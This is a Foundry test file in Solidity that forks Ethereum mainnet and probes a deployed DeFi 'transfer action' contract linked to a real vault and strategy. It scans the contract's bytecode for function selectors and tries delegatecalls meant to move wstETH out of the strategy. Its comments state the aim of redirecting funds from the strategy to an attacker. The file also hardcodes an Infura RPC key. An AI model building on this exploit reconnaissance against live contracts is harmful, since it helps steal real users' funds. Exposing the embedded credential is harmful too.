// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract SelectorLookup is Test {
    address constant TRANSFER_ACTION = 0xc780112305ED959CEEeb0DE692E2407E4145Fc3A;
    address constant VAULT_PULL = 0x313Ca6136521D22A7Ea763B3566Ed0B53F5B3AB9;
    address constant STRATEGY_0 = 0x60d2D94aCB969CA54e781007eE89F04c1A2e5943;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_IdentifySelectors() public pure {
        console.log("=== IDENTIFYING SELECTORS ===\n");

        // Found selectors: 0x8fca9153, 0x9093410d, 0x9864dcdd, 0x2fa13cb8, 0x5d1ca631, 0x8bcb6216

        // Calculate common DeFiSaver action selectors
        console.log("Common selectors:");
        console.log("executeAction(bytes,uint8[],bytes32[]):");
        console.logBytes4(bytes4(keccak256("executeAction(bytes,uint8[],bytes32[])")));

        console.log("executeActionDirect(bytes):");
        console.logBytes4(bytes4(keccak256("executeActionDirect(bytes)")));

        console.log("actionType():");
        console.logBytes4(bytes4(keccak256("actionType()")));

        console.log("parseInputs(bytes):");
        console.logBytes4(bytes4(keccak256("parseInputs(bytes)")));

        console.log("executeActionDirectL2():");
        console.logBytes4(bytes4(keccak256("executeActionDirectL2()")));

        console.log("NAME():");
        console.logBytes4(bytes4(keccak256("NAME()")));

        console.log("ID():");
        console.logBytes4(bytes4(keccak256("ID()")));

        console.log("registry():");
        console.logBytes4(bytes4(keccak256("registry()")));

        console.log("logger():");
        console.logBytes4(bytes4(keccak256("logger()")));

        // Try to match 0x9093410d, 0x9864dcdd, 0x2fa13cb8, 0x5d1ca631, 0x8bcb6216

        // VaultPush related?
        console.log("\nVault-related:");
        console.log("vaultPush(address,uint256):");
        console.logBytes4(bytes4(keccak256("vaultPush(address,uint256)")));

        console.log("vaultPull(address,uint256):");
        console.logBytes4(bytes4(keccak256("vaultPull(address,uint256)")));

        console.log("pushToVault(address,uint256):");
        console.logBytes4(bytes4(keccak256("pushToVault(address,uint256)")));

        // Token related
        console.log("\nToken-related:");
        console.log("sendToken(address,address,uint256):");
        console.logBytes4(bytes4(keccak256("sendToken(address,address,uint256)")));

        console.log("pullToken(address,address,uint256):");
        console.logBytes4(bytes4(keccak256("pullToken(address,address,uint256)")));

        console.log("_pullToken(address,address,uint256):");
        console.logBytes4(bytes4(keccak256("_pullToken(address,address,uint256)")));

        console.log("_sendToken(address,address,uint256):");
        console.logBytes4(bytes4(keccak256("_sendToken(address,address,uint256)")));

        console.log("_pushToken(address,uint256):");
        console.logBytes4(bytes4(keccak256("_pushToken(address,uint256)")));
    }

    function test_TryDirectSelectors() public {
        console.log("=== TRYING DIRECT SELECTORS ===\n");

        // Call the action directly with each selector
        bytes4[] memory selectors = new bytes4[](6);
        selectors[0] = bytes4(0x8fca9153); // executeAction
        selectors[1] = bytes4(0x9093410d);
        selectors[2] = bytes4(0x9864dcdd);
        selectors[3] = bytes4(0x2fa13cb8);
        selectors[4] = bytes4(0x5d1ca631);
        selectors[5] = bytes4(0x8bcb6216);

        vm.startPrank(attacker);

        for (uint i = 0; i < selectors.length; i++) {
            console.log("Trying selector:");
            console.logBytes4(selectors[i]);

            // Try with no args
            (bool success, bytes memory data) = TRANSFER_ACTION.staticcall(
                abi.encodePacked(selectors[i])
            );

            if (success) {
                console.log("  SUCCESS with no args!");
                if (data.length > 0 && data.length <= 64) {
                    console.logBytes(data);
                }
            }
        }

        vm.stopPrank();
    }

    function test_CompareWithVaultPull() public view {
        console.log("=== COMPARING WITH VAULT PULL ===\n");

        // VaultPull is known to work - compare structures

        bytes memory transferCode = TRANSFER_ACTION.code;
        bytes memory vaultPullCode = VAULT_PULL.code;

        console.log("TRANSFER_ACTION size:", transferCode.length);
        console.log("VaultPull size:", vaultPullCode.length);

        // Find selectors in VaultPull
        console.log("\nVaultPull selectors:");
        for (uint i = 0; i + 5 < vaultPullCode.length; i++) {
            if (uint8(vaultPullCode[i]) == 0x63) { // PUSH4
                bytes4 selector = bytes4(bytes.concat(vaultPullCode[i+1], vaultPullCode[i+2], vaultPullCode[i+3], vaultPullCode[i+4]));

                for (uint j = i + 5; j < i + 10 && j < vaultPullCode.length; j++) {
                    if (uint8(vaultPullCode[j]) == 0x14) { // EQ
                        console.logBytes4(selector);
                        break;
                    }
                }
            }
        }

        // Check if both have vault() call
        console.log("\nChecking vault() selector (0xfbfa77cf):");

        bool transferHasVault = false;
        bool vaultPullHasVault = false;

        for (uint i = 0; i + 3 < transferCode.length; i++) {
            bytes4 sel = bytes4(bytes.concat(transferCode[i], transferCode[i+1], transferCode[i+2], transferCode[i+3]));
            if (sel == bytes4(0xfbfa77cf)) {
                transferHasVault = true;
                console.log("TRANSFER_ACTION has vault() at offset:", i);
            }
        }

        for (uint i = 0; i + 3 < vaultPullCode.length; i++) {
            bytes4 sel = bytes4(bytes.concat(vaultPullCode[i], vaultPullCode[i+1], vaultPullCode[i+2], vaultPullCode[i+3]));
            if (sel == bytes4(0xfbfa77cf)) {
                vaultPullHasVault = true;
                console.log("VaultPull has vault() at offset:", i);
            }
        }
    }

    function test_AnalyzeVaultPushPattern() public view {
        console.log("=== ANALYZING VAULT PUSH PATTERN ===\n");

        // The TRANSFER_ACTION might be a VaultPush - pushes tokens TO the vault
        // Let's analyze if it transfers in the opposite direction of VaultPull

        // VaultPull: Vault -> Strategy (withdraw from vault)
        // VaultPush: Strategy -> Vault (deposit to vault)

        // But we want: Strategy -> Attacker

        // Key question: Does TRANSFER_ACTION have a controllable recipient?

        bytes memory code = TRANSFER_ACTION.code;

        // Look for msg.sender patterns (CALLER opcode = 0x33)
        uint256 callerCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0x33) callerCount++;
        }
        console.log("CALLER opcodes:", callerCount);

        // Look for address(this) patterns - might use this to determine source
        // In delegatecall context, address(this) = Strategy
    }

    function test_VaultPushExploit() public {
        console.log("=== TESTING VAULT PUSH EXPLOIT ===\n");

        // If TRANSFER_ACTION is VaultPush, it might:
        // 1. Call msg.sender.vault() to get vault
        // 2. Transfer tokens from address(this) to vault

        // In delegatecall context from Strategy:
        // - msg.sender = Strategy (who called execute)
        // - address(this) = Strategy

        // We need to find if there's a way to redirect the transfer

        // Let's try calling with different params as if we're Strategy
        deal(wstETH, STRATEGY_0, 10e18);
        console.log("Strategy wstETH before:", IERC20(wstETH).balanceOf(STRATEGY_0) / 1e18);
        console.log("Vault wstETH before:", IERC20(wstETH).balanceOf(VAULT) / 1e18);

        // Simulate Strategy calling the action
        vm.startPrank(STRATEGY_0);

        // Try executeAction with various params
        bytes memory params = abi.encode(
            wstETH,  // token
            1e18     // amount
        );

        (bool success,) = TRANSFER_ACTION.delegatecall(
            abi.encodeWithSignature(
                "executeAction(bytes,uint8[],bytes32[])",
                params,
                new uint8[](0),
                new bytes32[](0)
            )
        );

        vm.stopPrank();

        console.log("\nAfter attempt:");
        console.log("Strategy wstETH:", IERC20(wstETH).balanceOf(STRATEGY_0) / 1e18);
        console.log("Vault wstETH:", IERC20(wstETH).balanceOf(VAULT) / 1e18);

        if (IERC20(wstETH).balanceOf(STRATEGY_0) < 10e18) {
            console.log("TOKENS MOVED FROM STRATEGY!");
        }
    }
}
